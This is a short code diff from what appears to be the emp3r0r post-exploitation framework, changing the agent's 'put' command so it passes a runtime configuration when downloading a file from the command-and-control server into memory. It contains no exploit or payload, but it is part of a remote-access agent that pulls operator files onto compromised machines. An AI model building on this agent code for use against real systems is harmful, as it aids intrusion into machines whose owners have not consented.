@@ -8,6 +8,7 @@ import (
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -83,7 +84,7 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 
 	// Download to memory buffer first
 	logging.Printf("putCmdRun: downloading %s to memory buffer", fileName)
-	data, err := c2transport.FetchFile(downloadAddr, fileName, "", origChecksum)
+	data, err := c2transport.FetchFile(common.RuntimeConfig, downloadAddr, fileName, "", origChecksum)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory buffer %s: %v", fileName, err))
 		return
